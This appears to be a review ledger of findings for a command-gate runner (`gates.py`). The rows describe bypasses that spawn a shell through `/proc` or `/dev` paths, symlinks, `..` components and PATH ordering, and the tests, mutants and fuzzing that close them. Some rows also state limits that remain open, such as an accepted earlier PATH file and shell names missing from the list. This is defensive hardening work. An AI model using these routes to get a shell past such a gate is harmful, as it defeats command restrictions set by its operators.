| N43 | CHANGED r3c: NET-NEW (ATK5): in a non-shell gate an executable under `/proc` or `/dev` is a policy error that spawns nothing: every component of the physical walk (`_walk`: no normalisation; a link's target is read with `readlink` and walked, never followed through /proc; more than 40 links refused), every PATH entry and PATH hit up to the first hit. Only `argv[0]` is looked at: arguments, `python -c` bodies, wrapper arguments and declared shell gates are unaffected (cost: `/dev/shm/tool` is refused). Check: `test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder` (17 words, runner cwd != gate cwd, spawn spy, no out.txt), `test_the_real_cli_refuses_the_proc_cwd_bypass_and_creates_nothing` (3, real CLI, exit 2, the test-made `bash` would write `out.txt`), `test_a_path_entry_under_proc_or_dev_refuses_a_bare_name` (4), `test_a_relative_path_entry_that_is_a_link_into_proc_refuses_a_bare_name`, `test_a_symlink_in_the_gate_folder_that_leads_into_proc_or_dev_is_refused` (6), `test_a_path_hit_that_is_a_link_into_proc_is_refused`, `test_a_path_hit_that_is_a_link_into_proc_is_refused_when_the_runner_lacks_the_target` (D1c: fails on rev 3b), `test_a_link_loop_is_refused_not_followed_forever`, `test_the_proc_refusal_never_echoes_the_word`, `test_only_the_executable_word_is_looked_at_for_proc_and_dev`; 34 of the new cases fail on the rev-3 tree (Proof 13); `grep -c "_walk" gates.py` = 4; mutants V08-V25, W06-W12, T05, T05b die | own code | C9 |
| N44 | NET-NEW (ATK6): the judge's K08 dies: PATH `d1:d2`, `d1/mytool` a link to a shell, `d2/mytool` harmless: refused; reversed PATH: accepted. Independent of root, non-root and busybox (the shell is a test-made file called `bash`). Check: `test_the_first_path_hit_wins_not_the_last`; `02_strategy-architect_C9_judge_r3_mutants.py` K08 KILLED (Proof 11c) | own code | C9 |
| N45 | NET-NEW (stated limits, round 3): (1) an executable earlier on PATH that exec skips for another reason (no shebang, ENOEXEC; a shebang naming a missing interpreter, ENOENT) followed by a same-name shell link: the plan ACCEPTS and the child runs the shell (judge reproduced both); (2) the 14 names lack `ksh93`, `elvish`, `nu`, `xonsh` and versioned names; (3) older tests link to the host's `sh` and fail where `sh` is a busybox applet (Alpine UNVERIFIED). Check: `test_the_stated_limit_an_earlier_path_file_that_exec_skips_is_accepted` (2, pins (1) so it cannot drift silently), `test_shell_names_and_wrappers_are_the_documented_lists` (pins (2): the list is verbatim), `grep -c "NOT detected" gates.py` = 1 and the docstring names all three; (3) is stated only, no test can pin a host | own code | C9 |
| N46 | NET-NEW (D1): an executable word, or a PATH entry that the search reaches, with a `..` component is refused in non-shell gates, checked on the RAW string before anything is joined or normalised; no normpath or realpath remains in the safety path. Check: `test_the_d1_repro_exactly_as_qa_reported_it` (real CLI, runner in `D/a/b`; fails on rev 3b: exit 0 and a MARK), `test_any_dotdot_component_in_the_executable_is_refused_before_any_normalisation` (7), `test_dotdot_is_refused_in_a_path_entry_that_the_search_reaches_not_in_one_after_the_hit`, matrix rows r08-r15 and r46 (real CLI, 3 placements); `grep -c "normpath\|realpath" gates.py` = 0; mutants W01-W05 die. Cost stated: a harmless `..` in the executable word is refused; arguments, `python -c` bodies, wrapper arguments and declared shell gates keep theirs (`test_arguments_and_python_bodies_and_declared_shell_gates_keep_their_dotdot`) | own code | C9 |
| N47 | NET-NEW (D1): the path is resolved by one physical walk like the kernel: a relative link target starts from the link's own folder, an absolute one at `/`, targets are walked component by component, a link loop or more than 40 links is refused, an `OSError` while resolving is a refusal (not ignored). Check: `test_a_relative_link_target_is_resolved_from_the_links_own_folder`, `test_an_unreadable_link_or_any_os_error_while_resolving_is_a_refusal_not_a_pass`, `test_a_link_loop_is_refused_not_followed_forever`, matrix rows r02-r07, r31-r35; a `..` that a link target brings is applied to the folder reached so far (D1b): `test_a_dotdot_inside_a_link_target_is_applied_to_the_folder_reached_so_far`, `test_a_harmless_dotdot_inside_a_link_target_is_followed_not_refused`, matrix rows r36-r39; mutants W07-W22, V12, Q21, Q23 die | own code | C9 |
| N48 | NET-NEW (systematic closure): the resolution-mismatch family between the runner and the child for the executable word is a matrix of 64 real-CLI rows (link first, middle, last; `..` after a link in 6 forms and inside a link target; `/proc` and `/dev` words and links, also climbing to them with `..`; relative and empty PATH entries; a PATH hit that is a link into `/proc`; `//`, `/./`, trailing slash, case; symlinked gate cwd and `--root`; relative, absolute and mixed link targets; a directory link in PATH): 58 rows are refused in every placement (exit 2, policy-error, no MARK), 6 are documented limits that are pinned (the child really runs the marker). Check: `test_matrix_every_row_is_refused_with_the_runner_in_another_folder` (58), `test_matrix_core_rows_are_refused_in_every_runner_placement` (22 rows x M2 and M3), `test_matrix_documented_limits_really_run_the_marker` (6), the probe script's table (Proof 14: rev 3b {REFUSED: 49, LIMIT: 6, BYPASS: 9, ANOMALY: 0}, rev 3c {REFUSED: 58, LIMIT: 6, BYPASS: 0, ANOMALY: 0}), and the same run with `strace -f -e trace=execve` (gate execs 0 for refused rows). The matrix proves its rows and cannot prove the absence of another mismatch: still a speed bump, not a sandbox | own code | C9 |
| N49 | NET-NEW (QA survivors): Q25 `/developer`, `/devices`, `/procfs`, `/process`, `/devx` are NOT under `/dev` or `/proc`, while `/dev`, `/proc`, `//dev/null`, `/dev//null`, `/./dev/null` are (`test_the_root_names_are_matched_whole_so_a_sibling_folder_is_not_inside_them`; mutant V25); Q26 the double-slash forms (same test, matrix r19-r21, r58, r59 and mutants W21, W22); Q42 a metacharacter as the first character is refused (`test_a_metacharacter_as_the_first_character_is_refused_too`, 7); Q90 is equivalent; the QA batch Q01-Q90 on the shipped tree is in Proof 11d | own code | C9 |
| N50 | NET-NEW (systematic closure, D1b, D1c): a seeded differential fuzz compares the KERNEL's resolution of the executable word with the plan: truth = this process with its cwd set to the gate's cwd stats the word (what the child's exec resolves; `/proc/self/cwd` is then the gate's folder, and the PATH search takes the first executable regular file); plan = `_shell_refusal` with the process cwd in another folder (the runner). If the kernel reaches the test-made `bash`, the plan must refuse. Random links (to `/proc`, `/dev`, `..` chains, absolute, relative, mixed), random words (`//`, `/./`, `..`, trailing parts) and PATH values. Check: `test_differential_fuzz_the_kernel_resolution_versus_the_plan` (3 seeds x 150 layouts x 40 words, at least 40 routes to the shell per seed, 0 wrong); it FAILS on rev 3b and on the first rev-3c draft; the standalone `02_strategy-architect_C9_fuzz.py` (Proof 15) is 480,000 words over 8 seeds on the shipped tree: 0 violations, while rev 3b gives 57 and the draft 45 in 800 layouts; the script also checks its model against a real `Popen` of the same word: equal in every checked case | own code | C9 |
| N51 | NET-NEW (D1b, D1c): the walk applies a `..` that a link target brings to the folder reached so far (`os.path.dirname(cur)`, `/` stays `/`), and the PATH hit is walked BEFORE the file test and returned walked. Check: matrix rows r36-r39 (D1b) and r48, r49 (D1c) through the real CLI in M1 (runner elsewhere) and M3; `test_a_dotdot_inside_a_link_target_is_applied_to_the_folder_reached_so_far`, `test_a_path_hit_that_is_a_link_into_proc_is_refused_when_the_runner_lacks_the_target`; rows r36, r37 fail on the first rev-3c draft, r48, r49 on rev 3b and the draft (Proof 14); `grep -c "_walk" gates.py` = 4, `grep -c "normpath\|realpath" gates.py` = 0; mutants W17-W20, T05, T05b die | own code | C9 |
| N35 | NET-NEW: the report tail numbers (4,000 characters, 64,000-byte capture) and the timeout numbers (300 default, 1,800 max, 3,600 total), 50 gates and 262,144 bytes are the values in `gates.py`/`stream.py`. Check: `test_the_documented_bounds` (every constant), mutants K01-K16 die | own code | C9 |
